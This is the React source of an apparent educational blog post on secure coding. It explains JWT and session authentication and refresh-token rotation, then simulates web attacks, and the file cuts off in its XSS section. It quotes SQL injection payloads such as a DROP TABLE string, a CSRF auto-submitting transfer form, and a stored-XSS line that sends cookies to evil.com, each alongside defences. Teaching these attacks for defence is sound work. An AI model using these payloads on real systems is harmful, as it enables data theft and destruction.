import { Navigation } from '@/components/Navigation';
import { useLenis } from '@/hooks/useLenis';
import CodeBlock from '@/components/blog/CodeBlock';
import RunnableCode from '@/components/blog/RunnableCode';
import TableOfContents from '@/components/blog/TableOfContents';
import BlogNote from '@/components/blog/BlogNote';
import { ArrowLeft, Calendar, Clock, User } from 'lucide-react';
import { Link } from 'react-router-dom';

const tocItems = [
  { id: 'introduction', title: 'Introduction', level: 2 },
  { id: 'auth-internals', title: 'Authentication Internals', level: 2 },
  { id: 'jwt-vs-sessions', title: 'JWT vs Sessions', level: 3 },
  { id: 'refresh-tokens', title: 'Refresh Tokens', level: 3 },
  { id: 'rotation-strategies', title: 'Token Rotation', level: 3 },
  { id: 'web-attacks', title: 'Web Attack Simulations', level: 2 },
  { id: 'sql-injection', title: 'SQL Injection', level: 3 },
  { id: 'csrf', title: 'CSRF Attacks', level: 3 },
  { id: 'xss', title: 'XSS (Stored vs Reflected)', level: 3 },
  { id: 'oauth2', title: 'OAuth 2.0 Internals', level: 2 },
  { id: 'auth-code-flow', title: 'Authorization Code Flow', level: 3 },
  { id: 'pkce', title: 'PKCE for Mobile/SPAs', level: 3 },
  { id: 'security-checklist', title: 'Security Checklist', level: 2 },
  { id: 'resources', title: 'Resources', level: 2 },
];

const SecurityCoding = () => {
  useLenis();

  return (
    <div className="relative min-h-screen bg-background">
      <Navigation />
      
      <article className="pt-24 pb-20">
        <div className="max-w-7xl mx-auto px-6">
          {/* Back button */}
          <Link 
            to="/blogs" 
            className="inline-flex items-center gap-2 text-muted-foreground hover:text-accent transition-colors mb-8"
          >
            <ArrowLeft className="w-4 h-4" />
            Back to Blogs
          </Link>

          <div className="flex gap-12">
            {/* Sidebar */}
            <aside className="hidden lg:block w-64 flex-shrink-0">
              <div className="sticky top-28">
                <TableOfContents items={tocItems} />
              </div>
            </aside>

            {/* Main content */}
            <main className="flex-1 max-w-3xl">
              {/* Header */}
              <header className="mb-12">
                <div className="flex items-center gap-4 text-sm text-muted-foreground mb-4">
                  <span className="flex items-center gap-1.5">
                    <Calendar className="w-4 h-4" />
                    December 22, 2024
                  </span>
                  <span className="flex items-center gap-1.5">
                    <Clock className="w-4 h-4" />
                    45 min read
                  </span>
                  <span className="flex items-center gap-1.5">
                    <User className="w-4 h-4" />
                    Nitesh
                  </span>
                </div>
                
                <h1 className="text-4xl md:text-5xl font-display font-bold mb-6 leading-tight">
                  Security-Focused Coding<span className="text-accent">.</span>
                </h1>
                
                <p className="text-xl text-muted-foreground leading-relaxed">
                  Master authentication internals, understand common web attacks, and implement 
                  OAuth 2.0 properly. Security knowledge with very high ROI for your career.
                </p>

                {/* Featured image */}
                <div className="mt-8 rounded-xl overflow-hidden border border-border/50">
                  <img 
                    src="https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?w=1200&h=600&fit=crop" 
                    alt="Security and Code"
                    className="w-full h-64 md:h-80 object-cover"
                  />
                </div>

                {/* Difficulty badge */}
                <div className="flex gap-3 mt-6">
                  <span className="px-4 py-2 rounded-full bg-red-500/10 text-red-400 text-sm font-medium border border-red-500/20">
                    🔒 Security
                  </span>
                  <span className="px-4 py-2 rounded-full bg-green-500/10 text-green-400 text-sm font-medium border border-green-500/20">
                    High ROI
                  </span>
                </div>
              </header>

              {/* Content */}
              <div className="prose prose-invert max-w-none">
                
                {/* Introduction */}
                <section id="introduction" className="mb-12">
                  <h2 className="text-2xl font-display font-bold text-foreground mb-4 flex items-center gap-2">
                    <span className="text-accent">#</span> Introduction
                  </h2>
                  <p className="text-muted-foreground leading-relaxed mb-4">
                    Security vulnerabilities are everywhere. A single SQL injection can expose 
                    millions of user records. A misconfigured OAuth flow can let attackers 
                    hijack accounts. Understanding these attacks — and how to prevent them — 
                    is essential for every developer.
                  </p>
                  <p className="text-muted-foreground leading-relaxed mb-4">
                    This guide covers security topics that have massive ROI: authentication 
                    patterns used everywhere, attacks you'll encounter (and be asked about 
                    in interviews), and OAuth 2.0 flows that power "Login with Google."
                  </p>

                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 my-8">
                    <div className="text-center p-4 rounded-lg bg-card/50 border border-border/50">
                      <div className="text-2xl font-bold text-red-400 mb-1">SQLi</div>
                      <div className="text-xs text-muted-foreground">Injection</div>
                    </div>
                    <div className="text-center p-4 rounded-lg bg-card/50 border border-border/50">
                      <div className="text-2xl font-bold text-yellow-400 mb-1">XSS</div>
                      <div className="text-xs text-muted-foreground">Scripts</div>
                    </div>
                    <div className="text-center p-4 rounded-lg bg-card/50 border border-border/50">
                      <div className="text-2xl font-bold text-purple-400 mb-1">CSRF</div>
                      <div className="text-xs text-muted-foreground">Forgery</div>
                    </div>
                    <div className="text-center p-4 rounded-lg bg-card/50 border border-border/50">
                      <div className="text-2xl font-bold text-blue-400 mb-1">OAuth</div>
                      <div className="text-xs text-muted-foreground">Auth</div>
                    </div>
                  </div>
                </section>

                {/* Authentication Internals */}
                <section id="auth-internals" className="mb-12">
                  <h2 className="text-2xl font-display font-bold text-foreground mb-4 flex items-center gap-2">
                    <span className="text-accent">#</span> Authentication Internals
                  </h2>
                  <p className="text-muted-foreground leading-relaxed mb-4">
                    How do websites remember that you're logged in? There are two main 
                    approaches: server-side sessions and client-side tokens (JWTs). 
                    Each has tradeoffs.
                  </p>

                  <section id="jwt-vs-sessions" className="mb-8">
                    <h3 className="text-xl font-display font-bold text-foreground mb-3">JWT vs Sessions</h3>

                    <div className="grid md:grid-cols-2 gap-4 my-6">
                      <div className="p-4 rounded-lg border border-blue-500/30 bg-blue-500/5">
                        <h4 className="font-bold text-blue-400 mb-2">🍪 Session-Based Auth</h4>
                        <p className="text-sm text-muted-foreground mb-3">
                          Server stores session data, client gets a session ID cookie.
                        </p>
                        <ul className="text-xs text-muted-foreground space-y-1">
                          <li>+ Easy to invalidate (delete from server)</li>
                          <li>+ Server controls all session data</li>
                          <li>+ Smaller cookie size</li>
                          <li>- Requires server-side storage</li>
                          <li>- Harder to scale (sticky sessions)</li>
                          <li>- CSRF vulnerable if using cookies</li>
                        </ul>
                      </div>
                      <div className="p-4 rounded-lg border border-green-500/30 bg-green-500/5">
                        <h4 className="font-bold text-green-400 mb-2">🎟️ JWT-Based Auth</h4>
                        <p className="text-sm text-muted-foreground mb-3">
                          Self-contained token with user data, signed by server.
                        </p>
                        <ul className="text-xs text-muted-foreground space-y-1">
                          <li>+ Stateless (no server storage)</li>
                          <li>+ Easy to scale horizontally</li>
                          <li>+ Works across services</li>
                          <li>- Can't invalidate before expiry</li>
                          <li>- Larger payload size</li>
                          <li>- Token theft = full access</li>
                        </ul>
                      </div>
                    </div>

                    <div className="p-4 rounded-lg border border-border/50 bg-card/50 my-6">
                      <h4 className="font-bold text-foreground mb-3">Session Flow</h4>
                      <pre className="text-sm font-mono text-muted-foreground whitespace-pre-wrap">
{`1. User logs in with credentials
   Client ──POST /login──→ Server
   
2. Server creates session, stores in Redis/DB
   Session: { id: "abc123", userId: 42, role: "admin" }
   
3. Server sends session ID as HttpOnly cookie
   Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
   
4. Browser auto-sends cookie with every request
   Cookie: session_id=abc123
   
5. Server looks up session, knows who user is
   Redis.get("session:abc123") → { userId: 42, ... }`}
                      </pre>
                    </div>

                    <div className="p-4 rounded-lg border border-border/50 bg-card/50 my-6">
                      <h4 className="font-bold text-foreground mb-3">JWT Flow</h4>
                      <pre className="text-sm font-mono text-muted-foreground whitespace-pre-wrap">
{`1. User logs in with credentials
   Client ──POST /login──→ Server
   
2. Server creates JWT, signs with secret key
   JWT: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4ifQ.signature
   
3. Server sends JWT to client (in response body)
   { "token": "eyJ..." }
   
4. Client stores JWT (localStorage, memory, or cookie)
   localStorage.setItem("token", jwt)
   
5. Client sends JWT in Authorization header
   Authorization: Bearer eyJ...
   
6. Server verifies signature, extracts user data
   jwt.verify(token, SECRET) → { userId: 42, role: "admin" }`}
                      </pre>
                    </div>

                    <CodeBlock
                      code={`// JWT Structure: Header.Payload.Signature
// Each part is Base64URL encoded

// HEADER (algorithm & type)
{
  "alg": "HS256",  // HMAC-SHA256
  "typ": "JWT"
}

// PAYLOAD (claims)
{
  "sub": "user_123",           // Subject (user ID)
  "iat": 1703260800,           // Issued At (Unix timestamp)
  "exp": 1703264400,           // Expiration (1 hour later)
  "role": "admin",             // Custom claim
  "email": "user@example.com"  // Custom claim
}

// SIGNATURE
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)

// Complete JWT:
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
// eyJzdWIiOiJ1c2VyXzEyMyIsImlhdCI6MTcwMzI2MDgwMH0.
// Kh7BoQZ2FVxL9YmR5zK3xWnHqPvLQ8YrFnDm0tJxPj4

// Verification (Node.js with jsonwebtoken)
import jwt from 'jsonwebtoken';

const SECRET = process.env.JWT_SECRET;

// Create token
const token = jwt.sign(
  { userId: 123, role: 'admin' },
  SECRET,
  { expiresIn: '1h' }
);

// Verify token
try {
  const decoded = jwt.verify(token, SECRET);
  console.log(decoded.userId); // 123
} catch (error) {
  if (error.name === 'TokenExpiredError') {
    // Token expired, need to refresh
  } else if (error.name === 'JsonWebTokenError') {
    // Invalid signature - tampered or wrong secret
  }
}`}
                      language="typescript"
                      filename="jwt_explained.ts"
                    />

                    <BlogNote type="warning" title="Never Store Sensitive Data in JWT">
                      JWTs are only signed, not encrypted! Anyone can decode the payload. 
                      Never include passwords, SSNs, or other sensitive data in JWT claims.
                    </BlogNote>
                  </section>

                  <section id="refresh-tokens" className="mb-8">
                    <h3 className="text-xl font-display font-bold text-foreground mb-3">Refresh Tokens</h3>
                    <p className="text-muted-foreground leading-relaxed mb-4">
                      Short-lived access tokens (15 min) are secure but annoying — users 
                      get logged out frequently. <strong>Refresh tokens</strong> solve this by 
                      allowing silent token renewal.
                    </p>

                    <div className="p-4 rounded-lg border border-border/50 bg-card/50 my-6">
                      <h4 className="font-bold text-foreground mb-3">Token Pair Strategy</h4>
                      <pre className="text-sm font-mono text-muted-foreground whitespace-pre-wrap">
{`ACCESS TOKEN                    REFRESH TOKEN
├─ Short-lived (15 min)         ├─ Long-lived (7-30 days)
├─ Used for API requests        ├─ Used only to get new access token
├─ Stored in memory             ├─ Stored in HttpOnly cookie
├─ If stolen: limited damage    ├─ If stolen: can be revoked
└─ Stateless (JWT)              └─ Stateful (stored in DB)

FLOW:
1. Login → Get access_token + refresh_token
2. API calls use access_token
3. Access token expires after 15 min
4. Client uses refresh_token to get new access_token
5. User stays logged in without re-entering password
6. Logout → Invalidate refresh_token in DB`}
                      </pre>
                    </div>

                    <CodeBlock
                      code={`// Refresh Token Implementation
interface TokenPair {
  accessToken: string;   // Short-lived JWT
  refreshToken: string;  // Long-lived, stored in DB
}

interface RefreshTokenRecord {
  id: string;
  userId: string;
  token: string;
  expiresAt: Date;
  isRevoked: boolean;
  createdAt: Date;
  userAgent?: string;
  ipAddress?: string;
}

class AuthService {
  private accessTokenExpiry = '15m';
  private refreshTokenExpiry = 7 * 24 * 60 * 60 * 1000; // 7 days
  
  async login(email: string, password: string): Promise<TokenPair> {
    // Verify credentials
    const user = await this.verifyCredentials(email, password);
    
    // Generate token pair
    return this.generateTokenPair(user.id);
  }
  
  async generateTokenPair(userId: string): Promise<TokenPair> {
    // Short-lived access token (stateless)
    const accessToken = jwt.sign(
      { userId, type: 'access' },
      process.env.JWT_SECRET,
      { expiresIn: this.accessTokenExpiry }
    );
    
    // Long-lived refresh token (stored in DB)
    const refreshToken = crypto.randomBytes(64).toString('hex');
    
    await db.refreshTokens.create({
      userId,
      token: await bcrypt.hash(refreshToken, 10), // Hash before storing!
      expiresAt: new Date(Date.now() + this.refreshTokenExpiry),
      isRevoked: false,
    });
    
    return { accessToken, refreshToken };
  }
  
  async refresh(refreshToken: string): Promise<TokenPair> {
    // Find all active tokens for comparison
    const tokens = await db.refreshTokens.findMany({
      where: { isRevoked: false, expiresAt: { gt: new Date() } }
    });
    
    // Find matching token
    let tokenRecord: RefreshTokenRecord | null = null;
    for (const record of tokens) {
      if (await bcrypt.compare(refreshToken, record.token)) {
        tokenRecord = record;
        break;
      }
    }
    
    if (!tokenRecord) {
      throw new Error('Invalid refresh token');
    }
    
    // Revoke old token (rotation)
    await db.refreshTokens.update({
      where: { id: tokenRecord.id },
      data: { isRevoked: true }
    });
    
    // Generate new pair
    return this.generateTokenPair(tokenRecord.userId);
  }
  
  async logout(userId: string): Promise<void> {
    // Revoke ALL refresh tokens for this user
    await db.refreshTokens.updateMany({
      where: { userId },
      data: { isRevoked: true }
    });
  }
  
  async revokeAllSessions(userId: string): Promise<void> {
    // "Log out everywhere" feature
    await db.refreshTokens.updateMany({
      where: { userId },
      data: { isRevoked: true }
    });
  }
}

// Express middleware for protected routes
async function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const token = authHeader.slice(7);
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}`}
                      language="typescript"
                      filename="refresh_tokens.ts"
                    />
                  </section>

                  <section id="rotation-strategies" className="mb-8">
                    <h3 className="text-xl font-display font-bold text-foreground mb-3">Token Rotation Strategies</h3>
                    <p className="text-muted-foreground leading-relaxed mb-4">
                      <strong>Refresh token rotation</strong> issues a new refresh token with each 
                      use. This limits the window of opportunity if a token is stolen.
                    </p>

                    <div className="p-4 rounded-lg border border-red-500/30 bg-red-500/5 my-6">
                      <h4 className="font-bold text-red-400 mb-3">Detecting Token Theft</h4>
                      <pre className="text-sm font-mono text-muted-foreground whitespace-pre-wrap">
{`SCENARIO: Attacker steals refresh token

WITHOUT ROTATION:
Attacker: Uses stolen token → Gets access ✓
Attacker: Uses stolen token → Gets access ✓ (forever!)
User: Uses their token → Gets access ✓
User: Doesn't know token was stolen!

WITH ROTATION:
Attacker: Uses stolen token → Gets new pair (A2, R2)
User: Uses their token (R1) → INVALID! Token already used!
Server: Detects reuse → Revokes ALL tokens for user
User: Must re-login, attacker kicked out`}
                      </pre>
                    </div>

                    <CodeBlock
                      code={`// Automatic Token Reuse Detection
class SecureTokenService {
  async refresh(refreshToken: string): Promise<TokenPair> {
    const tokenRecord = await this.findToken(refreshToken);
    
    if (!tokenRecord) {
      throw new Error('Invalid token');
    }
    
    // CRITICAL: Check if token was already used
    if (tokenRecord.isUsed) {
      // Token reuse detected! Possible theft.
      console.error('SECURITY ALERT: Refresh token reuse detected', {
        userId: tokenRecord.userId,
        tokenId: tokenRecord.id,
      });
      
      // Revoke ALL tokens for this user (nuclear option)
      await this.revokeAllTokens(tokenRecord.userId);
      
      // Optional: Send security alert email
      await this.sendSecurityAlert(tokenRecord.userId);
      
      throw new Error('Security violation: token reuse');
    }
    
    // Mark current token as used (not just revoked)
    await db.refreshTokens.update({
      where: { id: tokenRecord.id },
      data: { isUsed: true, usedAt: new Date() }
    });
    
    // Create new token pair
    return this.generateTokenPair(tokenRecord.userId);
  }
}

// Token Family Tracking (alternative approach)
interface TokenFamily {
  familyId: string;     // Unique per login session
  userId: string;
  currentToken: string;
  generation: number;   // Increments with each rotation
  createdAt: Date;
}

class TokenFamilyService {
  async refresh(refreshToken: string): Promise<TokenPair> {
    const family = await this.findFamily(refreshToken);
    
    if (!family) {
      throw new Error('Invalid token');
    }
    
    // Check if this is the current token in the family
    if (family.currentToken !== refreshToken) {
      // Old token used! Someone has a copy.
      console.error('ALERT: Old token from family used');
      await this.invalidateFamily(family.familyId);
      throw new Error('Token family invalidated');
    }
    
    // Generate new token in the same family
    const newRefreshToken = crypto.randomBytes(64).toString('hex');
    
    await db.tokenFamilies.update({
      where: { familyId: family.familyId },
      data: {
        currentToken: newRefreshToken,
        generation: family.generation + 1,
      }
    });
    
    return {
      accessToken: this.generateAccessToken(family.userId),
      refreshToken: newRefreshToken,
    };
  }
}`}
                      language="typescript"
                      filename="token_rotation.ts"
                    />

                    <BlogNote type="tip" title="Best Practices">
                      <ul className="list-disc list-inside space-y-1 mt-2">
                        <li>Store refresh tokens in HttpOnly, Secure, SameSite cookies</li>
                        <li>Hash refresh tokens before storing in database</li>
                        <li>Implement token rotation with reuse detection</li>
                        <li>Track device/IP and alert on suspicious activity</li>
                        <li>Provide "logout everywhere" feature</li>
                      </ul>
                    </BlogNote>
                  </section>
                </section>

                {/* Web Attacks */}
                <section id="web-attacks" className="mb-12">
                  <h2 className="text-2xl font-display font-bold text-foreground mb-4 flex items-center gap-2">
                    <span className="text-accent">#</span> Web Attack Simulations
                  </h2>
                  <p className="text-muted-foreground leading-relaxed mb-4">
                    Understanding attacks is the first step to preventing them. Let's simulate 
                    the most common web vulnerabilities and learn how to defend against them.
                  </p>

                  <section id="sql-injection" className="mb-8">
                    <h3 className="text-xl font-display font-bold text-foreground mb-3">SQL Injection</h3>
                    <p className="text-muted-foreground leading-relaxed mb-4">
                      SQL injection occurs when user input is directly concatenated into SQL queries. 
                      Attackers can manipulate queries to access or destroy data.
                    </p>

                    <div className="p-4 rounded-lg border border-red-500/30 bg-red-500/5 my-6">
                      <h4 className="font-bold text-red-400 mb-3">💀 The Attack</h4>
                      <pre className="text-sm font-mono text-muted-foreground whitespace-pre-wrap">
{`VULNERABLE CODE:
const query = "SELECT * FROM users WHERE username = '" + username + "'";

NORMAL INPUT:
username = "alice"
Query: SELECT * FROM users WHERE username = 'alice'
Result: Returns alice's data ✓

MALICIOUS INPUT:
username = "' OR '1'='1"
Query: SELECT * FROM users WHERE username = '' OR '1'='1'
Result: Returns ALL users! 😱

EVEN WORSE:
username = "'; DROP TABLE users; --"
Query: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
Result: Deletes entire users table! 💀`}
                      </pre>
                    </div>

                    <CodeBlock
                      code={`// ❌ VULNERABLE: String concatenation
function vulnerableLogin(username: string, password: string) {
  const query = \`
    SELECT * FROM users 
    WHERE username = '\${username}' 
    AND password = '\${password}'
  \`;
  return db.execute(query);
}

// Attacker input:
// username: admin'--
// password: anything
// Query becomes: SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
// The -- comments out the password check!

// ✅ SAFE: Parameterized queries (prepared statements)
function safeLogin(username: string, password: string) {
  const query = \`
    SELECT * FROM users 
    WHERE username = $1 
    AND password = $2
  \`;
  return db.execute(query, [username, password]);
  // Database treats $1 and $2 as DATA, not SQL code
}

// ✅ SAFE: Using an ORM (Prisma example)
async function safeLoginPrisma(username: string, password: string) {
  return prisma.user.findFirst({
    where: {
      username: username,  // Prisma escapes automatically
      password: password,
    }
  });
}

// ✅ SAFE: Input validation + parameterized queries
import { z } from 'zod';

const loginSchema = z.object({
  username: z.string()
    .min(3)
    .max(50)
    .regex(/^[a-zA-Z0-9_]+$/), // Only alphanumeric + underscore
  password: z.string().min(8).max(100),
});

async function secureLogin(input: unknown) {
  // Validate input
  const { username, password } = loginSchema.parse(input);
  
  // Use parameterized query
  const user = await db.query(
    'SELECT * FROM users WHERE username = $1',
    [username]
  );
  
  // Verify password with bcrypt (never store plain passwords!)
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    return user;
  }
  
  throw new Error('Invalid credentials');
}`}
                      language="typescript"
                      filename="sql_injection.ts"
                    />

                    <RunnableCode
                      code={"// SQL Injection Simulation\nfunction vulnerableQuery(userInput) {\n  return \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n}\n\nfunction safeQuery(userInput) {\n  // Simulating parameterized query - value is escaped\n  const escaped = userInput.replace(/'/g, \"''\");\n  return \"SELECT * FROM users WHERE username = $1 -- Param: \" + escaped;\n}\n\nconst attacks = [\n  \"alice\",\n  \"' OR '1'='1\",\n  \"'; DROP TABLE users; --\",\n  \"admin'--\"\n];\n\nconst results = ['=== SQL Injection Demo ===', ''];\nattacks.forEach(input => {\n  results.push('Input: ' + input);\n  results.push('Vulnerable: ' + vulnerableQuery(input));\n  results.push('Safe: ' + safeQuery(input));\n  results.push('');\n});\n\nresults.join('\\n');"}
                      language="javascript"
                      filename="SQL Injection Demo"
                      onRun={() => {
                        function vulnerableQuery(userInput: string): string {
                          return "SELECT * FROM users WHERE username = '" + userInput + "'";
                        }
                        function safeQuery(userInput: string): string {
                          const escaped = userInput.replace(/'/g, "''");
                          return "SELECT * FROM users WHERE username = $1 -- Param: " + escaped;
                        }
                        const attacks = ["alice", "' OR '1'='1", "'; DROP TABLE users; --", "admin'--"];
                        const results = ['=== SQL Injection Demo ===', ''];
                        attacks.forEach(input => {
                          results.push('Input: ' + input);
                          results.push('Vulnerable: ' + vulnerableQuery(input));
                          results.push('Safe: ' + safeQuery(input));
                          results.push('');
                        });
                        return results.join('\n');
                      }}
                    />
                  </section>

                  <section id="csrf" className="mb-8">
                    <h3 className="text-xl font-display font-bold text-foreground mb-3">CSRF (Cross-Site Request Forgery)</h3>
                    <p className="text-muted-foreground leading-relaxed mb-4">
                      CSRF tricks a user's browser into making unwanted requests to a site 
                      where they're authenticated. The browser automatically sends cookies, 
                      so the server thinks the request is legitimate.
                    </p>

                    <div className="p-4 rounded-lg border border-red-500/30 bg-red-500/5 my-6">
                      <h4 className="font-bold text-red-400 mb-3">💀 The Attack</h4>
                      <pre className="text-sm font-mono text-muted-foreground whitespace-pre-wrap">
{`1. User logs into bank.com
   Browser gets session cookie: session_id=abc123
   
2. User visits evil.com (in another tab)

3. evil.com contains hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker" />
     <input type="hidden" name="amount" value="10000" />
   </form>
   <script>document.forms[0].submit()</script>
   
4. Browser submits form to bank.com
   INCLUDES session cookie automatically!
   
5. Bank.com sees valid session, processes transfer
   Attacker gets $10,000 😱`}
                      </pre>
                    </div>

                    <CodeBlock
                      code={`// CSRF Protection Strategies

// 1. CSRF Tokens (Synchronizer Token Pattern)
import crypto from 'crypto';

class CSRFProtection {
  generateToken(sessionId: string): string {
    const token = crypto.randomBytes(32).toString('hex');
    // Store token associated with session
    redis.set(\`csrf:\${sessionId}\`, token, 'EX', 3600);
    return token;
  }
  
  async validateToken(sessionId: string, token: string): Promise<boolean> {
    const storedToken = await redis.get(\`csrf:\${sessionId}\`);
    return storedToken === token;
  }
}

// In your form (server-rendered):
// <input type="hidden" name="_csrf" value="<%= csrfToken %>" />

// Express middleware
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const token = req.body._csrf || req.headers['x-csrf-token'];
    
    if (!csrf.validateToken(req.session.id, token)) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
});

// 2. SameSite Cookies (Modern Approach)
// Set cookie with SameSite attribute
res.cookie('session', sessionId, {
  httpOnly: true,        // No JavaScript access
  secure: true,          // HTTPS only
  sameSite: 'strict',    // Only send cookie for same-site requests
  // 'strict' = never sent cross-site
  // 'lax' = sent for top-level navigations (GET only)
});

// 3. Double Submit Cookie
// Send CSRF token as both cookie AND header
// Server verifies they match
app.use((req, res, next) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];
  
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    if (!cookieToken || cookieToken !== headerToken) {
      return res.status(403).json({ error: 'CSRF validation failed' });
    }
  }
  next();
});

// Client-side (for AJAX requests):
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': getCookie('csrf-token'), // Read from cookie, send as header
  },
  credentials: 'include',
  body: JSON.stringify({ to: 'friend', amount: 100 }),
});

// 4. Check Origin/Referer Headers
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://mysite.com', 'https://www.mysite.com'];
  
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    if (!origin || !allowedOrigins.some(o => origin.startsWith(o))) {
      return res.status(403).json({ error: 'Invalid origin' });
    }
  }
  next();
});`}
                      language="typescript"
                      filename="csrf_protection.ts"
                    />
                  </section>

                  <section id="xss" className="mb-8">
                    <h3 className="text-xl font-display font-bold text-foreground mb-3">XSS (Cross-Site Scripting)</h3>
                    <p className="text-muted-foreground leading-relaxed mb-4">
                      XSS allows attackers to inject malicious scripts into web pages viewed 
                      by other users. These scripts run with full access to the page's DOM, 
                      cookies, and can make requests on behalf of the user.
                    </p>

                    <div className="grid md:grid-cols-2 gap-4 my-6">
                      <div className="p-4 rounded-lg border border-red-500/30 bg-red-500/5">
                        <h4 className="font-bold text-red-400 mb-2">Stored XSS</h4>
                        <p className="text-sm text-muted-foreground">
                          Malicious script is saved to the database (e.g., in a comment). 
                          Every user who views the page executes the script.
                        </p>
                        <pre className="text-xs font-mono mt-2 text-muted-foreground">
{`Comment: <script>
  fetch('evil.com?cookie='+document.cookie)
</script>

Stored in DB, shown to all users!`}
                        </pre>
                      </div>
                      <div className="p-4 rounded-lg border border-yellow-500/30 bg-yellow-500/5">
                        <h4 className="font-bold text-yellow-400 mb-2">Reflected XSS</h4>
                        <p className="text-sm text-muted-foreground">
                          Malicious script is in the URL. Victim clicks a crafted link, 
                          script executes immediately.
                        </p>
                        <pre className="text-xs font-mono mt-2 text-muted-foreground">
{`URL: site.com/search?q=<script>
  alert('XSS')
</script>

Page shows: "Results for: <script>..."`}
                        </pre>
                      </div>
                    </div>

                    <div className="p-4 rounded-lg border border-purple-500/30 bg-purple-500/5 my-6">
                      <h4 className="font-bold text-purple-400 mb-2">DOM-Based XSS</h4>
                      <p className="text-sm text-muted-foreground">
                        The attack payload is executed as a result of modifying the DOM 
                        in the victim's browser. The malicious script never goes to the server.
                      </p>
                      <pre className="text-xs font-mono mt-2 text-muted-foreground">
{`// Vulnerable code:
document.getElementById('output').innerHTML = location.hash.slice(1);

// Attack URL:
site.com/#<img src=x onerror="alert('XSS')">

// Script runs entirely in browser!`}
                      </pre>
                    </div>

                    <CodeBlock
                      code={`// XSS Prevention Strategies

// ❌ VULNERABLE: Directly inserting user input
function vulnerableRender(userInput: string) {
  document.getElementById('output').innerHTML = userInput;
  // If userInput = "<script>evil()</script>", it executes!
}

// ✅ SAFE: Use textContent (not innerHTML)
function safeRenderText(userInput: string) {
  document.getElementById('output').textContent = userInput;
  // HTML is displayed as text, not executed
}

// ✅ SAFE: Escape HTML entities
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function safeRenderHtml(userInput: string) {
  document.getElementById('output').innerHTML = escapeHtml(userInput);
  // <script> becomes &lt;script&gt; - displayed as text
}

// ✅ SAFE: Content Security Policy (CSP)
// Set this header to restrict what scripts can run
// Content-Security-Policy: default-src 'self'; script-src 'self'

// Express middleware for CSP
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",           // Only load from same origin
    "script-src 'self'",             // Only run same-origin scripts
    "style-src 'self' 'unsafe-inline'", // Allow inline styles
    "img-src 'self' https:",         // Images from self or HTTPS
    "connect-src 'self' https://api.example.com", // API calls
  ].join('; '));
  next();
});

// ✅ SAFE: React automatically escapes
function SafeComponent({ userInput }: { userInput: string }) {
  // React escapes by default - this is SAFE
  return <div>{userInput}</div>;
  
  // ❌ DANGEROUS: dangerouslySetInnerHTML bypasses escaping
  // return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}

// ✅ SAFE: Sanitize if you MUST allow some HTML
import DOMPurify from 'dompurify';

function SafeHtmlComponent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href'],
  });
  
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ✅ SAFE: HttpOnly cookies (prevent XSS from stealing session)
res.cookie('session', sessionId, {
  httpOnly: true,  // JavaScript cannot access this cookie
  secure: true,
  sameSite: 'strict',
});`}
                      language="typescript"
                      filename="xss_prevention.ts"
                    />

                    <RunnableCode
                      code={"// XSS Escape Demo\nfunction escapeHtml(unsafe) {\n  return unsafe\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#039;');\n}\n\nconst attacks = [\n  '<script>alert(\"XSS\")</script>',\n  '<img src=x onerror=\"evil()\">',\n  '<a href=\"javascript:evil()\">Click</a>',\n  'Hello <b>World</b>'\n];\n\nconst results = ['=== XSS Escape Demo ===', ''];\nattacks.forEach(input => {\n  results.push('Original: ' + input);\n  results.push('Escaped:  ' + escapeHtml(input));\n  results.push('');\n});\n\nresults.join('\\n');"}
                      language="javascript"
                      filename="XSS Escape Demo"
                      onRun={() => {
                        function escapeHtml(unsafe: string): string {
                          return unsafe
                            .replace(/&/g, '&amp;')
                            .replace(/</g, '&lt;')
                            .replace(/>/g, '&gt;')
                            .replace(/"/g, '&quot;')
                            .replace(/'/g, '&#039;');
                        }
                        const attacks = [
                          '<script>alert("XSS")</script>',
                          '<img src=x onerror="evil()">',
                          '<a href="javascript:evil()">Click</a>',
                          'Hello <b>World</b>'
                        ];
                        const results = ['=== XSS Escape Demo ===', ''];
                        attacks.forEach(input => {
                          results.push('Original: ' + input);
                          results.push('Escaped:  ' + escapeHtml(input));
                          results.push('');
                        });
                        return results.join('\n');
                      }}
